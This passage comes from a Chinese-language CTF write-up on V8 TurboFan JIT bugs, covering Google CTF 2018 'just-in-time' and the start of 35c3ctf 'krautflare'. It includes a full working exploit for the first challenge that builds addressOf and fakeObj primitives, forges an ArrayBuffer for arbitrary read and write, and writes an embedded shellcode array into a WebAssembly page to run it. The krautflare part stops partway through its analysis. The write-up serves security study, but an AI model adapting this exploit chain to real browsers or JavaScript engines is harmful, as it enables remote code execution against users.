&quot;src/compiler/constant-folding-reducer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/control-flow-optimizer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/dead-code-elimination.h&quot;</span><br><span class="line">+#include &quot;src/compiler/duplicate-addition-reducer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/effect-control-linearizer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/escape-analysis-reducer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/escape-analysis.h&quot;</span><br><span class="line">@@ -1301,6 +1302,8 @@ struct TypedLoweringPhase &#123;</span><br><span class="line">                                data-&gt;jsgraph()-&gt;Dead());</span><br><span class="line">     DeadCodeElimination dead_code_elimination(&amp;graph_reducer, data-&gt;graph(),</span><br><span class="line">                                               data-&gt;common(), temp_zone);</span><br><span class="line">+    DuplicateAdditionReducer duplicate_addition_reducer(&amp;graph_reducer, data-&gt;graph(),</span><br><span class="line">+                                              data-&gt;common());</span><br><span class="line">     JSCreateLowering create_lowering(&amp;graph_reducer, data-&gt;dependencies(),</span><br><span class="line">                                      data-&gt;jsgraph(), data-&gt;js_heap_broker(),</span><br><span class="line">                                      data-&gt;native_context(), temp_zone);</span><br><span class="line">@@ -1318,6 +1321,7 @@ struct TypedLoweringPhase &#123;</span><br><span class="line">                                          data-&gt;js_heap_broker(), data-&gt;common(),</span><br><span class="line">                                          data-&gt;machine(), temp_zone);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);</span><br><span class="line">+    AddReducer(data, &amp;graph_reducer, &amp;duplicate_addition_reducer);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;create_lowering);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;constant_folding_reducer);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;typed_optimization);</span><br></pre></td></tr></table></figure>
+<p>patch文件在<code>TypedLoweringPhase</code>阶段增加了一个自定义的优化方案，它会检查该阶段的<code>Opcode</code>，如果遇到<code>kNumberAdd</code>，并且两个操作数为<code>NumberConstant</code>类型，那么就会将结果运算以后，替换节点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+Reduction DuplicateAdditionReducer::Reduce(Node* node) &#123;</span><br><span class="line">+  switch (node-&gt;opcode()) &#123;</span><br><span class="line">+    case IrOpcode::kNumberAdd:</span><br><span class="line">+      return ReduceAddition(node);</span><br><span class="line">+    default:</span><br><span class="line">+      return NoChange();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>
+<p>使用如下测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function opt(f) &#123;</span><br><span class="line">   var x = f ? 1.1:2.2;</span><br><span class="line">   var y = x + 1 + 1;</span><br><span class="line">   return y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt(true);</span><br><span class="line">   opt(false);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt(true));</span><br></pre></td></tr></table></figure>
+<p>在<code>typer</code>阶段时，使用了两次<code>SpeculativeNumberAdd[Number]</code>来进行加1<br><img src="https://p4.ssl.qhimg.com/t01e301c4340944c32b.png"><br>而到了<code>TypedLowering</code>阶段，由于使用的是<code>NumberAdd</code>，因此<code>1+1</code>直接被优化计算出来了<br><img src="https://p5.ssl.qhimg.com/t01907226ac456570bb.png"><br>假如使用如下的代码，发现不会使用<code>NumberAdd</code>，由此知道<code>NumberAdd</code>出现在不同的数值类型之间</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function opt(f) &#123;</span><br><span class="line">   var x = f ? 1:2;</span><br><span class="line">   var y = x + 1 + 1;</span><br><span class="line">   return y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>需要借助IEE754的精度丢失来达到利用，在IEE754中，能够准确表示的最大整数为<code>9007199254740991</code>，大于这个数进行运算的话，会出现错误。<br>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var x = 9007199254740991;</span><br><span class="line">x += 1;</span><br><span class="line">x += 1;</span><br><span class="line">x += 1;</span><br><span class="line">x += 1;</span><br><span class="line">x += 1;</span><br><span class="line">print(x);</span><br><span class="line">root@ubuntu:~/Desktop/google-ctf2018-final-just-in-time/debug# ./d8 1.js</span><br><span class="line">9007199254740992</span><br></pre></td></tr></table></figure>
+<p>而</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var x = 9007199254740991;</span><br><span class="line">x += 5;</span><br><span class="line">print(x);</span><br><span class="line">root@ubuntu:~/Desktop/google-ctf2018-final-just-in-time/debug# ./d8 1.js</span><br><span class="line">9007199254740996</span><br></pre></td></tr></table></figure>
+<p>因此，由于patch的加入，原本我们的<code>x + 1 + 1</code>与优化后的<code>x + 2</code>可能并不相等，那么就有可能在优化后造成数组越界。<br>首先构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function opt() &#123;</span><br><span class="line">   var arr = [1.1,2.2,3.3,4.4,5.5,6.6];</span><br><span class="line">   var x = Number.MAX_SAFE_INTEGER + 4;</span><br><span class="line">   var y = x + 1 + 1;</span><br><span class="line">   var index = y - (Number.MAX_SAFE_INTEGER + 1);</span><br><span class="line">   return arr[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt());</span><br></pre></td></tr></table></figure>
+<p>发现并没有成功越界，查看IR图<br><img src="https://p5.ssl.qhimg.com/t014d0fba0462389d80.png"><br>由于opt里面全都是<code>NumberConstants</code>，导致所有的加法都被优化了，而我们仅仅想要优化<code>1+1</code>，由此，我们可以构造一个<code>Phi</code>节点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function opt(f) &#123;</span><br><span class="line">   var arr = [1.1,2.2,3.3,4.4,5.5,6.6];</span><br><span class="line">   var x = f ? Number.MAX_SAFE_INTEGER + 4:Number.MAX_SAFE_INTEGER+1;</span><br><span class="line">   var y = x + 1 + 1;</span><br><span class="line">   var index = y - (Number.MAX_SAFE_INTEGER + 1);</span><br><span class="line">   return arr[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt(true);</span><br><span class="line">   opt(false);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt(true));</span><br></pre></td></tr></table></figure>
+<p>发现这回成功溢出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/google-ctf2018-final-just-in-time/debug# ./d8 1.js --trace-turbo</span><br><span class="line">Concurrent recompilation has been disabled for tracing.</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Begin compiling method opt using Turbofan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Finished compiling method opt using Turbofan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Begin compiling method  using Turbofan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Finished compiling method  using Turbofan</span><br><span class="line">-1.1885946300594787e+148</span><br></pre></td></tr></table></figure>
+<p>分析IR图，patch的优化后于<code>NumberAdd</code>等，因此在最后一步减法<code>NumberSubtract</code>后，确定了<code>Range(0,4)</code>，显然这个范围不会越界，但是接下来patch的优化将<code>NumberAdd(1,1)</code>优化为了2，那么最终结果已发生变化，但是没有更新<code>CheckBounds</code>的范围<br><img src="https://p0.ssl.qhimg.com/t01ab1976131a4dd33c.png"><br>那么到达<code>simplified lowering</code>时，<code>CheckBounds</code>就会被移除，那么就可以溢出了<br><img src="https://p5.ssl.qhimg.com/t01bbae7ab1fc8de91c.png"><br>那么构造<code>fakeObj</code>和<code>addressOf</code>原语，然后利用即可<br>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">function p64f(value1,value2) &#123;</span><br><span class="line">   dv.setUint32(0,value1,true);</span><br><span class="line">   dv.setUint32(0x4,value2,true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function i2f64(value) &#123;</span><br><span class="line">   dv.setBigUint64(0,BigInt(value),true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64f(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getBigUint64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var arr;</span><br><span class="line">function opt(f) &#123;</span><br><span class="line">   arr = [1.1,2.2,3.3,4.4,5.5,6.6];</span><br><span class="line">   var b = f ? Number.MAX_SAFE_INTEGER+0x4:Number.MAX_SAFE_INTEGER+0x1;</span><br><span class="line">   var c = b+1+1;</span><br><span class="line">   var index = c - (Number.MAX_SAFE_INTEGER + 1);</span><br><span class="line">   return arr[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x30000;i++) &#123;</span><br><span class="line">   opt(true);</span><br><span class="line">   opt(false);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;&#125;;</span><br><span class="line">double_elements_map_addr = u64f(opt(true)) - 0x1n;</span><br><span class="line">var obj_arr = [obj];</span><br><span class="line">var obj_elements_map = i2f64(double_elements_map_addr + 0xa1n);</span><br><span class="line">print(&quot;double_elements_map=&quot; + double_elements_map_addr.toString(16));</span><br><span class="line">print(&quot;obj_elements_map=&quot; + u64f(obj_elements_map).toString(16));</span><br><span class="line"></span><br><span class="line">function fakeObj_opt(addr,f) &#123;</span><br><span class="line">   arr = [addr,2.2,3.3,4.4,5.5,6.6];</span><br><span class="line">   var b = f ? Number.MAX_SAFE_INTEGER+0x4:Number.MAX_SAFE_INTEGER+0x1;</span><br><span class="line">   var c = b+1+1;</span><br><span class="line">   var index = c - (Number.MAX_SAFE_INTEGER + 1);</span><br><span class="line">   arr[index] = obj_elements_map;</span><br><span class="line">   return arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x30000;i++) &#123;</span><br><span class="line">   fakeObj_opt(1.1+i,true);</span><br><span class="line">   fakeObj_opt(1.1+i,false);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeObj(addr) &#123;</span><br><span class="line">   var addr_f = i2f64(addr + 0x1n);</span><br><span class="line">   return fakeObj_opt(addr_f,true)[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var double_elements_map_obj = fakeObj(double_elements_map_addr);</span><br><span class="line"></span><br><span class="line">function addressOf_opt(obj,f) &#123;</span><br><span class="line">   arr = [obj,obj,obj,obj,obj,obj];</span><br><span class="line">   var b = f ? Number.MAX_SAFE_INTEGER+0x4:Number.MAX_SAFE_INTEGER+0x1;</span><br><span class="line">   var c = b+1+1;</span><br><span class="line">   var index = c - (Number.MAX_SAFE_INTEGER + 1);</span><br><span class="line">   arr[index] = double_elements_map_obj;</span><br><span class="line">   return arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x30000;i++) &#123;</span><br><span class="line">   addressOf_opt(obj,true);</span><br><span class="line">   addressOf_opt(obj,false);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addressOf(obj) &#123;</span><br><span class="line">   var a = addressOf_opt(obj,true)[0];</span><br><span class="line">   return u64f(a) - 0x1n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);</span><br><span class="line">const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">var func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];</span><br><span class="line"></span><br><span class="line">var faker_addr = addressOf(faker);</span><br><span class="line">/*print(&#x27;wasm=&#x27;+addressOf(wasmInstance).toString(16));</span><br><span class="line">%DebugPrint(wasmInstance);</span><br><span class="line">%SystemBreak();*/</span><br><span class="line">wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0xf8n;</span><br><span class="line">var element_addr = faker_addr - 0x50n;</span><br><span class="line">//print(&#x27;element_addr=&#x27; + element_addr.toString(16));</span><br><span class="line">//fake a ArrayBuffer&#x27;s Map</span><br><span class="line">faker[0] = i2f64(0n);</span><br><span class="line">faker[1] = i2f64(0x1900042317080808n);</span><br><span class="line">faker[2] = i2f64(0x00000000082003ffn);</span><br><span class="line">faker[3] = i2f64(0);</span><br><span class="line"></span><br><span class="line">//faker a ArrayBuffer</span><br><span class="line">faker[4] = i2f64(element_addr+0x1n); //map</span><br><span class="line">faker[5] = i2f64(0); //properties</span><br><span class="line">faker[6] = i2f64(0); //elements</span><br><span class="line">faker[7] = p64f(0xffffffff,0); //length</span><br><span class="line">faker[8] = i2f64(wasm_shellcode_ptr_addr);</span><br><span class="line">faker[9] = 0x2;</span><br><span class="line"></span><br><span class="line">var arb_ArrayBuffer = fakeObj(element_addr+0x20n);</span><br><span class="line">var adv = new DataView(arb_ArrayBuffer);</span><br><span class="line">var wasm_shellcode_addr = adv.getBigUint64(0,true);</span><br><span class="line">print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));</span><br><span class="line">faker[8] = i2f64(wasm_shellcode_addr);</span><br><span class="line">//替换wasm的shellcode</span><br><span class="line">for (var i=0;i&lt;shellcode.length;i++) &#123;</span><br><span class="line">   adv.setUint32(i*4,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line">//执行shellcode</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
+<p>在<code>addressOf_opt</code>和<code>fakeObj_opt</code>中，我们没有直接返回<code>arr[0]</code>这是因为arr在opt函数内部，编译时收集的信息足够充分，即使我们改了map，也不影响其取出的值，因此，我们要返回整个arr对象。</p>
+<h2 id="0x03-35c3ctf-krautflare"><a href="#0x03-35c3ctf-krautflare" class="headerlink" title="0x03 35c3ctf-krautflare"></a>0x03 35c3ctf-krautflare</h2><h3 id="patch分析-1"><a href="#patch分析-1" class="headerlink" title="patch分析"></a>patch分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">commit 950e28228cefd1266cf710f021a67086e67ac6a6</span><br><span class="line">Author: Your Name &lt;you@example.com&gt;</span><br><span class="line">Date:   Sat Dec 15 14:59:37 2018 +0100</span><br><span class="line"></span><br><span class="line">    Revert &quot;[turbofan] Fix Math.expm1 builtin typing.&quot;</span><br><span class="line">    </span><br><span class="line">    This reverts commit c59c9c46b589deb2a41ba07cf87275921b8b2885.</span><br><span class="line"></span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index 60e7ed574a..8324dc06d7 100644</span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ -1491,6 +1491,7 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">     // Unary math functions.</span><br><span class="line">     case BuiltinFunctionId::kMathAbs:</span><br><span class="line">     case BuiltinFunctionId::kMathExp:</span><br><span class="line">+    case BuiltinFunctionId::kMathExpm1:</span><br><span class="line">       return Type::Union(Type::PlainNumber(), Type::NaN(), t-&gt;zone());</span><br><span class="line">     case BuiltinFunctionId::kMathAcos:</span><br><span class="line">     case BuiltinFunctionId::kMathAcosh:</span><br><span class="line">@@ -1500,7 +1501,6 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">     case BuiltinFunctionId::kMathAtanh:</span><br><span class="line">     case BuiltinFunctionId::kMathCbrt:</span><br><span class="line">     case BuiltinFunctionId::kMathCos:</span><br><span class="line">-    case BuiltinFunctionId::kMathExpm1:</span><br><span class="line">     case BuiltinFunctionId::kMathFround:</span><br><span class="line">     case BuiltinFunctionId::kMathLog:</span><br><span class="line">     case BuiltinFunctionId::kMathLog1p:</span><br><span class="line">diff --git a/test/mjsunit/regress/regress-crbug-880207.js b/test/mjsunit/regress/regress-crbug-880207.js</span><br><span class="line">index 09796a9ff4..0f65ddb56b 100644</span><br><span class="line">--- a/test/mjsunit/regress/regress-crbug-880207.js</span><br><span class="line">+++ b/test/mjsunit/regress/regress-crbug-880207.js</span><br><span class="line">@@ -4,34 +4,10 @@</span><br><span class="line"> </span><br><span class="line"> // Flags: --allow-natives-syntax</span><br><span class="line"> </span><br><span class="line">-(function TestOptimizedFastExpm1MinusZero() &#123;</span><br><span class="line">-  function foo() &#123;</span><br><span class="line">-    return Object.is(Math.expm1(-0), -0);</span><br><span class="line">-  &#125;</span><br><span class="line">+function foo() &#123;</span><br><span class="line">+  return Object.is(Math.expm1(-0), -0);</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line">-  assertTrue(foo());</span><br><span class="line">-  %OptimizeFunctionOnNextCall(foo);</span><br><span class="line">-  assertTrue(foo());</span><br><span class="line">-&#125;)();</span><br><span class="line">-</span><br><span class="line">-(function TestOptimizedExpm1MinusZeroSlowPath() &#123;</span><br><span class="line">-  function f(x) &#123;</span><br><span class="line">-    return Object.is(Math.expm1(x), -0);</span><br><span class="line">-  &#125;</span><br><span class="line">-</span><br><span class="line">-  function g() &#123;</span><br><span class="line">-    return f(-0);</span><br><span class="line">-  &#125;</span><br><span class="line">-</span><br><span class="line">-  f(0);</span><br><span class="line">-  // Compile function optimistically for numbers (with fast inlined</span><br><span class="line">-  // path for Math.expm1).</span><br><span class="line">-  %OptimizeFunctionOnNextCall(f);</span><br><span class="line">-  // Invalidate the optimistic assumption, deopting and marking non-number</span><br><span class="line">-  // input feedback in the call IC.</span><br><span class="line">-  f(&quot;0&quot;);</span><br><span class="line">-  // Optimize again, now with non-lowered call to Math.expm1.</span><br><span class="line">-  assertTrue(g());</span><br><span class="line">-  %OptimizeFunctionOnNextCall(g);</span><br><span class="line">-  assertTrue(g());</span><br><span class="line">-&#125;)();</span><br><span class="line">+assertTrue(foo());</span><br><span class="line">+%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">+assertTrue(foo());</span><br></pre></td></tr></table></figure>
+<p>这是一个v8的历史漏洞，patch将漏洞重新引入，其代号为<code>880207</code>，首先该漏洞出现在<code>typer.cc</code>中，因此猜测该漏洞出现在<code>Typer</code>阶段，并且该漏洞与<code>Math.expm1(x)</code>函数有关,<code>Typer</code>推断<code>Math.expm1(x)</code>函数的返回类型时，认为<code>Math.expm1(x)</code>的返回类型为<code>PlainNumber</code>或者<code>Nan</code>，却忽略了一种情况，那就是<code>Math.expm1(-0)</code>，其返回值为<code>-0</code>，而<code>-0</code>属于<code>HEAP_NUMBER_TYPE</code>类型，在JIT编译时期与运行时期，就会有不一样的结果，比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.is(Math.expm1(-0),-0)</span><br></pre></td></tr></table></figure>
+<p>在编译时期，JIT认为该值肯定为<code>false</code>，因为两者的类型不可能相等，但是在实际运行当中，<code>Object.is(Math.expm1(x),-0)</code>，如果x为-0，那么结果就会为<code>true</code>。</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在javascript中，布尔类型可以直接做加减乘除运算</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">false+1</span><br><span class="line">1</span><br><span class="line">true+1</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+<p>因此，我们可以利用这种特性，将漏洞转换为一个数组越界，首先构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function opt(x) &#123;</span><br><span class="line">   var a = Object.is(Math.expm1(x),-0);</span><br><span class="line">   var arr = [1.1,2.2,3.3,4.4];</span><br><span class="line">   a += 3;</span><br><span class="line">   return arr[a];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt(0);</span><br><span class="line">   opt(&quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt(-0));</span><br></pre></td></tr></table></figure>
+<p>用<code>opt(&quot;0&quot;);</code>是为了适配非<code>PlainNumber</code>类型的参数，这样最后一步调用<code>opt(-0)</code>不会进行<code>deoptimization</code>，运行发现，没有成功越界，查看IR图<br><img src="https://p4.ssl.qhimg.com/t0145b5d118c312ee6c.png"><br>可以看到<code>JSCall[PlainNumber | NaN]</code>，然后使用<code>SameValue</code>运算后，与3相加，最后得出范围<code>Range(0,3)</code>传给<code>CheckBounds</code><br>然而到了<code>TypedLowering</code>阶段，发现下标直接变成了3，即发生常数折叠<br><img src="https://p4.ssl.qhimg.com/t01a5d7a91b568081b8.png"><br>为了避免发生这样的常数折叠现象，我们可以使用一个<code>字典对象</code>来将我们的<code>-0</code>包含在内部，这样，只有在<code>Escape Analyse</code>阶段才能知道其值。</p>
